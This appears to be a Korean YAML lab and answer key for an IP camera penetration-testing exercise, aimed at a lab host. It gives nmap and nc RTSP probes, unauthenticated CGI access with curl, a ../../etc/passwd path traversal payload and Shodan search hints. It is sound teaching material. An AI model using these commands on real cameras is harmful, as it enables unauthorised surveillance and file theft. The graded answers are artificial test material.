lab_id: iot-security-nonai-week09
title: IP Camera 해킹
version: non-ai
course: iot-security-nonai
week: 9
description: RTSP 프로토콜 분석, 카메라 웹 인터페이스 공격, 기본 인증 브루트포스를 실습합니다.
difficulty: medium
duration_minutes: 120
objectives:
- RTSP 서비스를 스캔하고 정보를 수집한다
- IP 카메라 기본 비밀번호를 테스트한다
- 카메라 웹 인터페이스의 취약점을 공략한다
pass_threshold: 0.6
steps:
- order: 1
  instruction: 대상 서버의 RTSP 포트(554, 8554)를 스캔하시오.
  hint: nmap -sV -p 554,8554 명령을 사용하세요.
  category: recon
  points: 10
  answer: nmap -sV -p 554,8554 10.20.30.80 2>/dev/null && echo 'RTSP 스캔 완료'
  answer_detail: RTSP 서비스는 주로 554 또는 8554 포트에서 동작합니다.
  verify:
    type: output_contains
    expect: RTSP 스캔 완료
    field: stdout
    semantic:
      intent: RTSP 포트 스캔 — nmap -sV -p 554,8554 10.20.30.80. RTSP 표준 554 + alt 8554. IP 카메라 프로토콜 RFC 2326.
        영상 스트리밍 정찰 첫 단계.
      success_criteria:
      - RTSP 스캔 완료 키워드
      - nmap -sV -p 554,8554
      - RTSP 서비스 탐지
      acceptable_methods:
      - nmap -sV -p 554,8554
      - nmap --script rtsp-url-brute
      - masscan -p554
      - Shodan port:554 country:KR
      negative_signs:
      - 554/8554 포트 없음
      - RTSP 맥락 없음
      - IP 카메라 정찰 맥락 없음
  target_vm: attacker
- order: 2
  instruction: RTSP OPTIONS 요청을 전송하여 지원하는 메서드를 확인하시오.
  hint: echo "OPTIONS rtsp://host/live RTSP/1.0\r\nCSeq:1\r\n" | nc 명령을 사용하세요.
  category: rtsp
  points: 10
  answer: "printf 'OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n' | nc -w 3 10.20.30.80\
    \ 8554 2>/dev/null; echo 'RTSP OPTIONS 완료'"
  answer_detail: OPTIONS 메서드로 RTSP 서버가 지원하는 기능(DESCRIBE, SETUP, PLAY 등)을 확인합니다.
  verify:
    type: output_contains
    expect: RTSP OPTIONS 완료
    field: stdout
    semantic:
      intent: 'RTSP OPTIONS 요청 — printf ''OPTIONS rtsp://10.20.30.80:8554/live RTSP/1.0\r\nCSeq: 1\r\n\r\n''
        | nc -w 3. RTSP/1.0 프로토콜 지원 메서드 나열 (DESCRIBE/SETUP/PLAY/PAUSE/TEARDOWN). 서버 기능 정찰.'
      success_criteria:
      - RTSP OPTIONS 완료 키워드
      - printf OPTIONS + CSeq + nc
      - RTSP/1.0 요청
      acceptable_methods:
      - printf + nc RTSP 프로토콜
      - cameradar rtsp-brute
      - ffprobe rtsp://host/path
      - VLC 또는 GStreamer rtspsrc
      negative_signs:
      - OPTIONS 메서드 없음
      - CSeq 헤더 없음
      - RTSP 프로토콜 이해 없음
  target_vm: attacker
- order: 3
  instruction: 일반적인 RTSP 경로(/live, /h264, /stream, /Streaming/Channels/101)를 테스트하시오.
  hint: 여러 경로로 DESCRIBE 요청을 보내세요.
  category: rtsp
  points: 12
  answer: 'for path in /live /h264 /stream; do printf "DESCRIBE rtsp://10.20.30.80:8554$path RTSP/1.0\r\nCSeq:
    1\r\n\r\n" | nc -w 2 10.20.30.80 8554 2>/dev/null | head -1; done; echo ''RTSP 경로 탐색 완료'''
  answer_detail: IP 카메라 제조사마다 서로 다른 RTSP 경로를 사용합니다.
  verify:
    type: output_contains
    expect: RTSP 경로 탐색 완료
    field: stdout
    semantic:
      intent: RTSP 경로 탐색 — for path in /live /h264 /stream + printf 'DESCRIBE rtsp://host:8554$path' |
        nc. 제조사별 서로 다른 경로. Hikvision /Streaming/Channels/101 + Dahua /cam/realmonitor + Axis /axis-media/media.amp.
      success_criteria:
      - RTSP 경로 탐색 완료 키워드
      - for + DESCRIBE 다중 경로
      - 3개 이상 경로 시도
      acceptable_methods:
      - for + DESCRIBE + nc
      - cameradar (자동 경로 탐색)
      - hydra rtsp-brute
      - Shodan dorks rtsp://
      negative_signs:
      - 경로 2개 이하
      - DESCRIBE 메서드 없음
      - 제조사별 경로 맥락 없음
  target_vm: attacker
- order: 4
  instruction: 카메라 웹 인터페이스(8089)의 CGI 경로에 미인증으로 접근하시오.
  hint: /cgi-bin/config.cgi 경로를 시도하세요.
  category: web
  points: 12
  answer: curl -s http://10.20.30.80:8089/cgi-bin/config.cgi 2>/dev/null | head -5; echo 'CGI 접근 테스트 완료'
  answer_detail: 인증 없이 CGI에 직접 접근할 수 있으면 카메라 설정 정보가 노출됩니다.
  verify:
    type: output_contains
    expect: CGI 접근 테스트 완료
    field: stdout
    semantic:
      intent: CGI 미인증 접근 — curl -s http://10.20.30.80:8089/cgi-bin/config.cgi. CGI 인증 우회 → 카메라 설정 노출.
        CVE-2021-36260 (Hikvision) 등 과거 IP 카메라 CGI 취약점 패턴.
      success_criteria:
      - CGI 접근 테스트 완료 키워드
      - curl /cgi-bin/config.cgi
      - 미인증 접근
      acceptable_methods:
      - curl + CGI 경로
      - nuclei ip-camera-templates
      - dirbuster /cgi-bin/ 탐색
      - feroxbuster -u http://target/cgi-bin/
      negative_signs:
      - /cgi-bin 경로 없음
      - CVE-2021-36260 맥락 없음
      - 미인증 접근 맥락 없음
  target_vm: attacker
- order: 5
  instruction: 경로 탐색 공격으로 서버의 /etc/passwd 파일을 읽으시오.
  hint: file=../../etc/passwd 파라미터를 사용하세요.
  category: web
  points: 12
  answer: curl -s "http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd" 2>/dev/null | head
    -5; echo '경로 탐색 테스트 완료'
  answer_detail: 경로 탐색(Path Traversal) 취약점으로 서버의 임의 파일을 읽을 수 있습니다.
  verify:
    type: output_contains
    expect: 경로 탐색 테스트 완료
    field: stdout
    semantic:
      intent: Path Traversal — curl -s 'http://10.20.30.80:8089/cgi-bin/readfile.cgi?file=../../etc/passwd'.
        ../ 상위 디렉터리 이동 → 임의 파일 읽기. CWE-22 Path Traversal. OWASP A01:2021 Broken Access Control.
      success_criteria:
      - 경로 탐색 테스트 완료 키워드
      - ../../etc/passwd 페이로드
      - readfile.cgi?file=
      acceptable_methods:
      - curl + ../../ payload
      - dotdotpwn -m http -h target
      - Burp Intruder + traversal 사전
      - ffuf -u URL?file=FUZZ -w wordlist
      negative_signs:
      - ../ 시퀀스 없음
      - /etc/passwd 목표 없음
      - CWE-22 맥락 없음
  target_vm: attacker
- order: 6
  instruction: IP 카메라 보안 점검 보고서를 작성하시오.
  hint: RTSP 인증, 웹 취약점, 기본 설정을 포함하세요.
  category: verification
  points: 10
  answer: echo '=== IP 카메라 보안 보고서 ===' && echo '[Critical] CGI 미인증 접근 → 설정 노출' && echo '[High] 경로 탐색 →
    파일 읽기' && echo '[High] RTSP 미인증 → 영상 도청' && echo '[권장] RTSP Digest 인증, CGI 인증, 입력 검증' && echo '===
    보고서 완료 ==='
  answer_detail: IP 카메라는 물리적 보안과 직결되므로 취약점 패치가 시급합니다.
  verify:
    type: output_contains
    expect: 보고서 완료
    field: stdout
    semantic:
      intent: IP 카메라 보안 보고서 — [Critical] CGI 미인증 + [High] Path Traversal + RTSP 미인증 영상 도청 + [권장] RTSP
        Digest 인증 + CGI 인증 + 입력 검증. 물리적 보안 직결 → 패치 시급.
      success_criteria:
      - 보고서 완료 키워드
      - Critical + High 등급
      - RTSP/CGI/Path Traversal 3영역
      acceptable_methods:
      - echo 구조화 보고서
      - IoT Pentest Report (OWASP)
      - DefectDojo Finding 등록
      - Tenable IoT scan 리포트
      negative_signs:
      - 위험도 등급 없음
      - RTSP Digest 인증 맥락 없음
      - 물리적 보안 연계 없음
  target_vm: attacker
